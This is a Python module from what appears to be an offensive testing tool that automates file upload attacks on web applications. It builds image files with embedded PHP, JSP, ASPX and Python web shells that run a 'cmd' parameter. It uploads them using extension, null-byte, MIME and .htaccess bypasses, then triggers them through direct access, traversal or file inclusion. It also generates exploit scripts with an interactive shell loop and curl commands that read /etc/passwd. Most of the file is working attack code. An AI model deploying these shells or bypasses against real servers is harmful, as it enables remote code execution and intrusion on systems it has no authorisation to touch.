"""File Upload Bypass module for automated polyglot generation and upload testing

This module implements:
- Polyglot file generation (valid as both images and executable code)
- File upload bypass techniques (double extensions, MIME manipulation, magic bytes)
- Automatic execution triggering (traversal, direct access, inclusion)
- Multi-language payload generation (PHP, JSP, ASPX, Python)
"""

import base64
import io
import os
import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional, Tuple
from urllib.parse import quote

from src.vulnchain.core.request_handler import RequestHandler, Response
from src.vulnchain.core.payload_engine import PayloadEngine


class PolyglotType(Enum):
    """Types of polyglot files"""
    
    PHP_IMAGE = "php_image"  # PHP code embedded in image
    JSP_IMAGE = "jsp_image"  # JSP code embedded in image
    ASPX_IMAGE = "aspx_image"  # ASPX code embedded in image
    PYTHON_IMAGE = "python_image"  # Python code embedded in image


class BypassTechnique(Enum):
    """File upload bypass techniques"""
    
    DOUBLE_EXTENSION = "double_extension"  # file.php.jpg
    MIME_MANIPULATION = "mime_manipulation"  # Change Content-Type
    MAGIC_BYTES = "magic_bytes"  # Inject image magic bytes
    NULL_BYTE = "null_byte"  # file.php%00.jpg
    CASE_VARIATION = "case_variation"  # file.PhP
    HTACCESS = "htaccess"  # Upload .htaccess to enable execution


class ExecutionTrigger(Enum):
    """Methods to trigger uploaded file execution"""
    
    DIRECT_ACCESS = "direct_access"  # Access uploaded file directly
    PATH_TRAVERSAL = "path_traversal"  # Use traversal to access file
    FILE_INCLUSION = "file_inclusion"  # Use LFI/RFI to include file
    FORCED_BROWSING = "forced_browsing"  # Guess upload directory


@dataclass
class UploadPoint:
    """Represents a file upload endpoint"""
    
    url: str
    parameter: str  # Form field name for file upload
    method: str = "POST"
    headers: Dict[str, str] = field(default_factory=dict)
    additional_fields: Dict[str, str] = field(default_factory=dict)
    upload_directory: Optional[str] = None  # Known or guessed upload directory


@dataclass
class UploadResult:
    """Result of file upload testing"""
    
    upload_point: UploadPoint
    is_vulnerable: bool
    bypass_technique: Optional[BypassTechnique] = None
    execution_trigger: Optional[ExecutionTrigger] = None
    uploaded_filename: Optional[str] = None
    uploaded_url: Optional[str] = None
    polyglot_type: Optional[PolyglotType] = None
    confidence: float = 0.0
    execution_output: Optional[str] = None
    evidence: List[str] = field(default_factory=list)
    metadata: Dict = field(default_factory=dict)



class PolyglotGenerator:
    """Generate polyglot files that are valid as both images and code"""
    
    # Magic bytes for common image formats
    MAGIC_BYTES = {
        "gif": b"GIF89a",
        "png": b"\x89PNG\r\n\x1a\n",
        "jpg": b"\xff\xd8\xff\xe0",
        "bmp": b"BM",
    }
    
    # Minimal valid image structures
    MINIMAL_IMAGES = {
        "gif": b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;",
        "png": b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82",
        "jpg": b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a\x1f\x1e\x1d\x1a\x1c\x1c $.' \",#\x1c\x1c(7),01444\x1f'9=82<.342\xff\xc0\x00\x0b\x08\x00\x01\x00\x01\x01\x01\x11\x00\xff\xc4\x00\x1f\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0b\xff\xc4\x00\xb5\x10\x00\x02\x01\x03\x03\x02\x04\x03\x05\x05\x04\x04\x00\x00\x01}\x01\x02\x03\x00\x04\x11\x05\x12!1A\x06\x13Qa\x07\"q\x142\x81\x91\xa1\x08#B\xb1\xc1\x15R\xd1\xf0$3br\x82\t\n\x16\x17\x18\x19\x1a%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz\x83\x84\x85\x86\x87\x88\x89\x8a\x92\x93\x94\x95\x96\x97\x98\x99\x9a\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xff\xda\x00\x08\x01\x01\x00\x00?\x00\xfe\xfe\xff\xd9",
    }
    
    def generate_php_polyglot(
        self,
        image_format: str = "gif",
        payload: Optional[str] = None,
    ) -> bytes:
        """Generate PHP polyglot file
        
        Args:
            image_format: Image format (gif, png, jpg, bmp)
            payload: Optional custom PHP payload
        
        Returns:
            Polyglot file bytes
        """
        if payload is None:
            # Default PHP payload - simple web shell
            payload = '<?php system($_GET["cmd"]); ?>'
        
        # Get minimal valid image
        image_data = self.MINIMAL_IMAGES.get(image_format, self.MINIMAL_IMAGES["gif"])
        
        # Embed PHP code in image
        # For GIF: PHP code can be in comment section
        # For PNG: PHP code can be in text chunk
        # For JPG: PHP code can be in comment marker
        
        if image_format == "gif":
            # GIF allows comments - embed PHP in comment
            polyglot = image_data + b"\n" + payload.encode() + b"\n"
        
        elif image_format == "png":
            # PNG allows text chunks - embed PHP in tEXt chunk
            php_bytes = payload.encode()
            chunk_data = b"comment\x00" + php_bytes
            chunk_length = len(chunk_data).to_bytes(4, 'big')
            chunk_type = b"tEXt"
            chunk_crc = self._calculate_crc32(chunk_type + chunk_data).to_bytes(4, 'big')
            
            # Insert before IEND chunk
            iend_pos = image_data.rfind(b"IEND")
            if iend_pos > 0:
                polyglot = (
                    image_data[:iend_pos-4] +
                    chunk_length + chunk_type + chunk_data + chunk_crc +
                    image_data[iend_pos-4:]
                )
            else:
                polyglot = image_data + b"\n" + php_bytes
        
        elif image_format == "jpg":
            # JPG allows comment markers (0xFFFE)
            php_bytes = payload.encode()
            comment_length = (len(php_bytes) + 2).to_bytes(2, 'big')
            comment_marker = b"\xff\xfe" + comment_length + php_bytes
            
            # Insert after SOI marker
            polyglot = image_data[:2] + comment_marker + image_data[2:]
        
        else:
            # Default: append PHP code
            polyglot = image_data + b"\n" + payload.encode()
        
        return polyglot

    
    def generate_jsp_polyglot(
        self,
        image_format: str = "gif",
        payload: Optional[str] = None,
    ) -> bytes:
        """Generate JSP polyglot file
        
        Args:
            image_format: Image format (gif, png, jpg, bmp)
            payload: Optional custom JSP payload
        
        Returns:
            Polyglot file bytes
        """
        if payload is None:
            # Default JSP payload - simple command execution
            payload = '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
        
        # Get minimal valid image
        image_data = self.MINIMAL_IMAGES.get(image_format, self.MINIMAL_IMAGES["gif"])
        
        # Embed JSP code in image (similar to PHP)
        polyglot = image_data + b"\n" + payload.encode() + b"\n"
        
        return polyglot
    
    def generate_aspx_polyglot(
        self,
        image_format: str = "gif",
        payload: Optional[str] = None,
    ) -> bytes:
        """Generate ASPX polyglot file
        
        Args:
            image_format: Image format (gif, png, jpg, bmp)
            payload: Optional custom ASPX payload
        
        Returns:
            Polyglot file bytes
        """
        if payload is None:
            # Default ASPX payload - simple command execution
            payload = '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start(Request["cmd"]); %>'
        
        # Get minimal valid image
        image_data = self.MINIMAL_IMAGES.get(image_format, self.MINIMAL_IMAGES["gif"])
        
        # Embed ASPX code in image
        polyglot = image_data + b"\n" + payload.encode() + b"\n"
        
        return polyglot
    
    def generate_python_polyglot(
        self,
        image_format: str = "gif",
        payload: Optional[str] = None,
    ) -> bytes:
        """Generate Python polyglot file
        
        Args:
            image_format: Image format (gif, png, jpg, bmp)
            payload: Optional custom Python payload
        
        Returns:
            Polyglot file bytes
        """
        if payload is None:
            # Default Python payload - simple command execution
            payload = 'import os; os.system(request.args.get("cmd", ""))'
        
        # Get minimal valid image
        image_data = self.MINIMAL_IMAGES.get(image_format, self.MINIMAL_IMAGES["gif"])
        
        # Embed Python code in image
        polyglot = image_data + b"\n" + payload.encode() + b"\n"
        
        return polyglot
    
    def _calculate_crc32(self, data: bytes) -> int:
        """Calculate CRC32 checksum for PNG chunks
        
        Args:
            data: Data to calculate CRC for
        
        Returns:
            CRC32 checksum
        """
        import zlib
        return zlib.crc32(data) & 0xffffffff



class FileUploadBypassTester:
    """Test file upload vulnerabilities with bypass techniques"""
    
    # Common upload directories to test
    COMMON_UPLOAD_DIRS = [
        "/uploads/",
        "/upload/",
        "/files/",
        "/images/",
        "/img/",
        "/media/",
        "/assets/",
        "/static/uploads/",
        "/public/uploads/",
        "/content/uploads/",
        "/wp-content/uploads/",
        "/user_uploads/",
        "/attachments/",
    ]
    
    # File extensions for different server-side languages
    EXTENSIONS = {
        "php": [".php", ".php3", ".php4", ".php5", ".phtml", ".phar"],
        "jsp": [".jsp", ".jspx"],
        "aspx": [".aspx", ".ashx", ".asmx"],
        "python": [".py", ".pyc"],
    }
    
    def __init__(
        self,
        request_handler: RequestHandler,
        payload_engine: Optional[PayloadEngine] = None,
    ):
        """Initialize file upload bypass tester
        
        Args:
            request_handler: Request handler for HTTP communication
            payload_engine: Optional payload engine for wordlists
        """
        self.request_handler = request_handler
        self.payload_engine = payload_engine or PayloadEngine()
        self.polyglot_generator = PolyglotGenerator()
    
    async def test_upload_point(
        self,
        upload_point: UploadPoint,
        techniques: Optional[List[BypassTechnique]] = None,
        polyglot_types: Optional[List[PolyglotType]] = None,
    ) -> List[UploadResult]:
        """Test an upload point for bypass vulnerabilities
        
        Args:
            upload_point: The upload point to test
            techniques: List of bypass techniques to use (default: all)
            polyglot_types: List of polyglot types to test (default: all)
        
        Returns:
            List of upload results
        """
        if techniques is None:
            techniques = list(BypassTechnique)
        
        if polyglot_types is None:
            polyglot_types = list(PolyglotType)
        
        results = []
        
        # Test each polyglot type
        for polyglot_type in polyglot_types:
            # Test each bypass technique
            for technique in techniques:
                result = await self._test_bypass_technique(
                    upload_point,
                    polyglot_type,
                    technique,
                )
                
                if result:
                    results.append(result)
                    
                    # If we found a vulnerability, we can continue testing
                    # to find all possible bypass methods
                    if result.is_vulnerable:
                        pass  # Continue testing other techniques
        
        return results

    
    async def _test_bypass_technique(
        self,
        upload_point: UploadPoint,
        polyglot_type: PolyglotType,
        technique: BypassTechnique,
    ) -> Optional[UploadResult]:
        """Test a specific bypass technique
        
        Args:
            upload_point: The upload point to test
            polyglot_type: Type of polyglot to generate
            technique: Bypass technique to use
        
        Returns:
            UploadResult if successful, None otherwise
        """
        # Generate polyglot file
        polyglot_data = self._generate_polyglot(polyglot_type)
        
        # Generate filename based on bypass technique
        filename = self._generate_filename(polyglot_type, technique)
        
        # Determine MIME type based on technique
        mime_type = self._get_mime_type(technique)
        
        # Upload file
        upload_response = await self._upload_file(
            upload_point,
            filename,
            polyglot_data,
            mime_type,
        )
        
        # Check if upload was successful
        if upload_response.status_code not in [200, 201, 302]:
            return UploadResult(
                upload_point=upload_point,
                is_vulnerable=False,
                bypass_technique=technique,
                polyglot_type=polyglot_type,
                confidence=0.0,
            )
        
        # Try to determine uploaded file location
        uploaded_url = self._extract_uploaded_url(upload_response, filename, upload_point)
        
        if not uploaded_url:
            # Try to guess upload location
            uploaded_url = await self._guess_upload_location(upload_point, filename)
        
        if not uploaded_url:
            return UploadResult(
                upload_point=upload_point,
                is_vulnerable=False,
                bypass_technique=technique,
                polyglot_type=polyglot_type,
                uploaded_filename=filename,
                confidence=0.0,
                evidence=["File uploaded but location unknown"],
            )
        
        # Try to trigger execution
        execution_result = await self._trigger_execution(
            uploaded_url,
            polyglot_type,
        )
        
        if execution_result:
            is_vulnerable, execution_trigger, output = execution_result
            
            if is_vulnerable:
                return UploadResult(
                    upload_point=upload_point,
                    is_vulnerable=True,
                    bypass_technique=technique,
                    execution_trigger=execution_trigger,
                    uploaded_filename=filename,
                    uploaded_url=uploaded_url,
                    polyglot_type=polyglot_type,
                    confidence=0.95,
                    execution_output=output,
                    evidence=[
                        f"File upload bypass successful using {technique.value}",
                        f"Uploaded file: {filename}",
                        f"File location: {uploaded_url}",
                        f"Execution triggered via {execution_trigger.value}",
                        f"Output: {output[:200]}...",
                    ],
                )
        
        # File uploaded but execution not confirmed
        return UploadResult(
            upload_point=upload_point,
            is_vulnerable=False,
            bypass_technique=technique,
            polyglot_type=polyglot_type,
            uploaded_filename=filename,
            uploaded_url=uploaded_url,
            confidence=0.3,
            evidence=[
                f"File uploaded successfully using {technique.value}",
                f"Uploaded file: {filename}",
                f"File location: {uploaded_url}",
                "Execution not confirmed",
            ],
        )

    
    def _generate_polyglot(self, polyglot_type: PolyglotType) -> bytes:
        """Generate polyglot file based on type
        
        Args:
            polyglot_type: Type of polyglot to generate
        
        Returns:
            Polyglot file bytes
        """
        if polyglot_type == PolyglotType.PHP_IMAGE:
            return self.polyglot_generator.generate_php_polyglot()
        elif polyglot_type == PolyglotType.JSP_IMAGE:
            return self.polyglot_generator.generate_jsp_polyglot()
        elif polyglot_type == PolyglotType.ASPX_IMAGE:
            return self.polyglot_generator.generate_aspx_polyglot()
        elif polyglot_type == PolyglotType.PYTHON_IMAGE:
            return self.polyglot_generator.generate_python_polyglot()
        else:
            return self.polyglot_generator.generate_php_polyglot()
    
    def _generate_filename(
        self,
        polyglot_type: PolyglotType,
        technique: BypassTechnique,
    ) -> str:
        """Generate filename based on bypass technique
        
        Args:
            polyglot_type: Type of polyglot
            technique: Bypass technique
        
        Returns:
            Filename string
        """
        # Determine base extension
        if polyglot_type == PolyglotType.PHP_IMAGE:
            code_ext = ".php"
        elif polyglot_type == PolyglotType.JSP_IMAGE:
            code_ext = ".jsp"
        elif polyglot_type == PolyglotType.ASPX_IMAGE:
            code_ext = ".aspx"
        elif polyglot_type == PolyglotType.PYTHON_IMAGE:
            code_ext = ".py"
        else:
            code_ext = ".php"
        
        base_name = "shell"
        
        if technique == BypassTechnique.DOUBLE_EXTENSION:
            # file.php.jpg
            return f"{base_name}{code_ext}.jpg"
        
        elif technique == BypassTechnique.MIME_MANIPULATION:
            # file.php (but with image MIME type)
            return f"{base_name}{code_ext}"
        
        elif technique == BypassTechnique.MAGIC_BYTES:
            # file.php (with image magic bytes)
            return f"{base_name}{code_ext}"
        
        elif technique == BypassTechnique.NULL_BYTE:
            # file.php%00.jpg
            return f"{base_name}{code_ext}%00.jpg"
        
        elif technique == BypassTechnique.CASE_VARIATION:
            # file.PhP
            return f"{base_name}.PhP"
        
        elif technique == BypassTechnique.HTACCESS:
            # .htaccess file
            return ".htaccess"
        
        else:
            return f"{base_name}{code_ext}"
    
    def _get_mime_type(self, technique: BypassTechnique) -> str:
        """Get MIME type based on bypass technique
        
        Args:
            technique: Bypass technique
        
        Returns:
            MIME type string
        """
        if technique == BypassTechnique.MIME_MANIPULATION:
            # Use image MIME type even for code files
            return "image/gif"
        elif technique == BypassTechnique.HTACCESS:
            return "text/plain"
        else:
            # Default to image MIME for polyglots
            return "image/gif"

    
    async def _upload_file(
        self,
        upload_point: UploadPoint,
        filename: str,
        file_data: bytes,
        mime_type: str,
    ) -> Response:
        """Upload file to the upload point
        
        Args:
            upload_point: The upload point
            filename: Filename to use
            file_data: File data bytes
            mime_type: MIME type
        
        Returns:
            Response object
        """
        # Prepare multipart form data
        files = {
            upload_point.parameter: (filename, file_data, mime_type)
        }
        
        # Add additional form fields
        data = upload_point.additional_fields.copy() if upload_point.additional_fields else {}
        
        # Send upload request
        response = await self.request_handler.send_request(
            method=upload_point.method,
            url=upload_point.url,
            headers=upload_point.headers,
            files=files,
            data=data,
        )
        
        return response
    
    def _extract_uploaded_url(
        self,
        response: Response,
        filename: str,
        upload_point: UploadPoint,
    ) -> Optional[str]:
        """Extract uploaded file URL from response
        
        Args:
            response: Upload response
            filename: Uploaded filename
            upload_point: Upload point
        
        Returns:
            Uploaded file URL if found, None otherwise
        """
        # Try to find URL in response
        response_text = response.text
        
        # Look for common patterns
        patterns = [
            # Direct URL in response
            rf'https?://[^\s<>"]+{re.escape(filename)}',
            # Relative path
            rf'/[^\s<>"]*{re.escape(filename)}',
            # JSON response with file path
            rf'"(?:url|path|file|location)":\s*"([^"]*{re.escape(filename)}[^"]*)"',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                url = match.group(1) if match.lastindex else match.group(0)
                
                # Make absolute URL if relative
                if url.startswith('/'):
                    from urllib.parse import urlparse
                    parsed = urlparse(upload_point.url)
                    url = f"{parsed.scheme}://{parsed.netloc}{url}"
                
                return url
        
        # Check if upload_directory is known
        if upload_point.upload_directory:
            from urllib.parse import urlparse, urljoin
            parsed = urlparse(upload_point.url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            return urljoin(base_url, upload_point.upload_directory + filename)
        
        return None
    
    async def _guess_upload_location(
        self,
        upload_point: UploadPoint,
        filename: str,
    ) -> Optional[str]:
        """Guess upload location by testing common directories
        
        Args:
            upload_point: Upload point
            filename: Uploaded filename
        
        Returns:
            Uploaded file URL if found, None otherwise
        """
        from urllib.parse import urlparse, urljoin
        
        parsed = urlparse(upload_point.url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        # Test common upload directories
        for upload_dir in self.COMMON_UPLOAD_DIRS:
            test_url = urljoin(base_url, upload_dir + filename)
            
            # Try to access the file
            try:
                response = await self.request_handler.send_request(
                    method="GET",
                    url=test_url,
                )
                
                if response.status_code == 200:
                    # File found!
                    return test_url
            except:
                continue
        
        return None

    
    async def _trigger_execution(
        self,
        uploaded_url: str,
        polyglot_type: PolyglotType,
    ) -> Optional[Tuple[bool, ExecutionTrigger, str]]:
        """Try to trigger execution of uploaded file
        
        Args:
            uploaded_url: URL of uploaded file
            polyglot_type: Type of polyglot
        
        Returns:
            Tuple of (is_vulnerable, execution_trigger, output) if successful, None otherwise
        """
        # Try different execution triggers
        triggers = [
            ExecutionTrigger.DIRECT_ACCESS,
            ExecutionTrigger.PATH_TRAVERSAL,
            ExecutionTrigger.FILE_INCLUSION,
        ]
        
        for trigger in triggers:
            result = await self._try_execution_trigger(
                uploaded_url,
                polyglot_type,
                trigger,
            )
            
            if result:
                is_vulnerable, output = result
                if is_vulnerable:
                    return True, trigger, output
        
        return None
    
    async def _try_execution_trigger(
        self,
        uploaded_url: str,
        polyglot_type: PolyglotType,
        trigger: ExecutionTrigger,
    ) -> Optional[Tuple[bool, str]]:
        """Try a specific execution trigger
        
        Args:
            uploaded_url: URL of uploaded file
            polyglot_type: Type of polyglot
            trigger: Execution trigger to try
        
        Returns:
            Tuple of (is_vulnerable, output) if successful, None otherwise
        """
        if trigger == ExecutionTrigger.DIRECT_ACCESS:
            return await self._try_direct_access(uploaded_url, polyglot_type)
        
        elif trigger == ExecutionTrigger.PATH_TRAVERSAL:
            return await self._try_path_traversal(uploaded_url, polyglot_type)
        
        elif trigger == ExecutionTrigger.FILE_INCLUSION:
            return await self._try_file_inclusion(uploaded_url, polyglot_type)
        
        return None
    
    async def _try_direct_access(
        self,
        uploaded_url: str,
        polyglot_type: PolyglotType,
    ) -> Optional[Tuple[bool, str]]:
        """Try direct access to uploaded file
        
        Args:
            uploaded_url: URL of uploaded file
            polyglot_type: Type of polyglot
        
        Returns:
            Tuple of (is_vulnerable, output) if successful, None otherwise
        """
        # Add test command parameter
        test_url = uploaded_url + "?cmd=echo%20VULNCHAIN_TEST_12345"
        
        try:
            response = await self.request_handler.send_request(
                method="GET",
                url=test_url,
            )
            
            # Check if command was executed
            if "VULNCHAIN_TEST_12345" in response.text:
                return True, response.text
            
            # Check for other execution indicators
            if self._detect_code_execution(response.text, polyglot_type):
                return True, response.text
        
        except Exception as e:
            pass
        
        return None
    
    async def _try_path_traversal(
        self,
        uploaded_url: str,
        polyglot_type: PolyglotType,
    ) -> Optional[Tuple[bool, str]]:
        """Try path traversal to access uploaded file
        
        Args:
            uploaded_url: URL of uploaded file
            polyglot_type: Type of polyglot
        
        Returns:
            Tuple of (is_vulnerable, output) if successful, None otherwise
        """
        from urllib.parse import urlparse, urlunparse
        
        # Extract filename from URL
        parsed = urlparse(uploaded_url)
        path_parts = parsed.path.split('/')
        filename = path_parts[-1] if path_parts else ""
        
        if not filename:
            return None
        
        # Try traversal sequences to access the file
        traversal_sequences = [
            f"../uploads/{filename}",
            f"../../uploads/{filename}",
            f"../../../uploads/{filename}",
            f"./uploads/{filename}",
            f"uploads/{filename}",
        ]
        
        # Get base URL (without path)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        for sequence in traversal_sequences:
            # Try with a vulnerable parameter (common patterns)
            test_urls = [
                f"{base_url}/?file={sequence}",
                f"{base_url}/?page={sequence}",
                f"{base_url}/?include={sequence}",
                f"{base_url}/index.php?file={sequence}",
            ]
            
            for test_url in test_urls:
                # Add test command
                test_url_with_cmd = test_url + "&cmd=echo%20VULNCHAIN_TEST_12345"
                
                try:
                    response = await self.request_handler.send_request(
                        method="GET",
                        url=test_url_with_cmd,
                    )
                    
                    # Check if command was executed
                    if "VULNCHAIN_TEST_12345" in response.text:
                        return True, response.text
                    
                    # Check for other execution indicators
                    if self._detect_code_execution(response.text, polyglot_type):
                        return True, response.text
                
                except Exception as e:
                    continue
        
        return None

    
    async def _try_file_inclusion(
        self,
        uploaded_url: str,
        polyglot_type: PolyglotType,
    ) -> Optional[Tuple[bool, str]]:
        """Try file inclusion to execute uploaded file
        
        Args:
            uploaded_url: URL of uploaded file
            polyglot_type: Type of polyglot
        
        Returns:
            Tuple of (is_vulnerable, output) if successful, None otherwise
        """
        from urllib.parse import urlparse
        
        # Extract path from uploaded URL
        parsed = urlparse(uploaded_url)
        uploaded_path = parsed.path
        
        # Get base URL
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        # Try LFI with uploaded file path
        lfi_params = ["file", "page", "include", "path", "template", "document"]
        
        for param in lfi_params:
            # Try different LFI patterns
            test_urls = [
                f"{base_url}/?{param}={uploaded_path}",
                f"{base_url}/index.php?{param}={uploaded_path}",
                f"{base_url}/?{param}=.{uploaded_path}",  # Relative path
            ]
            
            for test_url in test_urls:
                # Add test command
                test_url_with_cmd = test_url + "&cmd=echo%20VULNCHAIN_TEST_12345"
                
                try:
                    response = await self.request_handler.send_request(
                        method="GET",
                        url=test_url_with_cmd,
                    )
                    
                    # Check if command was executed
                    if "VULNCHAIN_TEST_12345" in response.text:
                        return True, response.text
                    
                    # Check for other execution indicators
                    if self._detect_code_execution(response.text, polyglot_type):
                        return True, response.text
                
                except Exception as e:
                    continue
        
        return None
    
    def _detect_code_execution(
        self,
        response_text: str,
        polyglot_type: PolyglotType,
    ) -> bool:
        """Detect if code was executed based on response
        
        Args:
            response_text: Response text
            polyglot_type: Type of polyglot
        
        Returns:
            True if execution detected, False otherwise
        """
        # Look for execution indicators
        execution_indicators = [
            "VULNCHAIN_TEST",
            # PHP indicators
            "<?php",
            "system(",
            # JSP indicators
            "Runtime.getRuntime()",
            # ASPX indicators
            "System.Diagnostics.Process",
            # Python indicators
            "os.system",
            # Generic shell output indicators
            "uid=",
            "gid=",
            "/bin/",
            "root:",
        ]
        
        for indicator in execution_indicators:
            if indicator in response_text:
                return True
        
        return False


class FileUploadExploitGenerator:
    """Generate exploit code for file upload vulnerabilities"""
    
    def __init__(self, upload_result: UploadResult):
        """Initialize exploit generator
        
        Args:
            upload_result: Successful upload result
        """
        self.upload_result = upload_result
    
    def generate_python_exploit(self) -> str:
        """Generate Python exploit script
        
        Returns:
            Python exploit code
        """
        upload_point = self.upload_result.upload_point
        uploaded_url = self.upload_result.uploaded_url
        
        script = f'''#!/usr/bin/env python3
"""
File Upload Bypass Exploit
Generated for: {upload_point.url}
Bypass technique: {self.upload_result.bypass_technique.value if self.upload_result.bypass_technique else "N/A"}
"""

import requests

# Upload endpoint
upload_url = "{upload_point.url}"

# Uploaded file URL
uploaded_url = "{uploaded_url}"

# Generate polyglot file
def generate_polyglot():
    # Minimal GIF header + PHP code
    gif_header = b"GIF89a"
    php_code = b'<?php system($_GET["cmd"]); ?>'
    return gif_header + b"\\n" + php_code + b"\\n"

# Upload file
def upload_file():
    files = {{
        "{upload_point.parameter}": ("{self.upload_result.uploaded_filename}", generate_polyglot(), "image/gif")
    }}
    
    response = requests.post(upload_url, files=files)
    print(f"Upload status: {{response.status_code}}")
    return response

# Execute command
def execute_command(cmd):
    exec_url = uploaded_url + f"?cmd={{cmd}}"
    response = requests.get(exec_url)
    print(f"Execution status: {{response.status_code}}")
    print(f"Output:\\n{{response.text}}")
    return response

# Main
if __name__ == "__main__":
    print("[*] Uploading polyglot file...")
    upload_response = upload_file()
    
    print("[*] Attempting command execution...")
    execute_command("id")
    
    print("[*] Interactive shell:")
    while True:
        try:
            cmd = input("$ ")
            if cmd.lower() in ["exit", "quit"]:
                break
            execute_command(cmd)
        except KeyboardInterrupt:
            break
'''
        
        return script
    
    def generate_curl_commands(self) -> str:
        """Generate curl commands for exploitation
        
        Returns:
            Curl commands
        """
        upload_point = self.upload_result.upload_point
        uploaded_url = self.upload_result.uploaded_url
        
        commands = f'''# File Upload Bypass - Curl Commands

# Step 1: Create polyglot file
echo -e "GIF89a\\n<?php system(\\$_GET[\\"cmd\\"]); ?>\\n" > shell.php.gif

# Step 2: Upload file
curl -X POST "{upload_point.url}" \\
  -F "{upload_point.parameter}=@shell.php.gif;type=image/gif"

# Step 3: Execute command
curl "{uploaded_url}?cmd=id"

# Step 4: Interactive exploitation
curl "{uploaded_url}?cmd=whoami"
curl "{uploaded_url}?cmd=ls+-la"
curl "{uploaded_url}?cmd=cat+/etc/passwd"
'''
        
        return commands
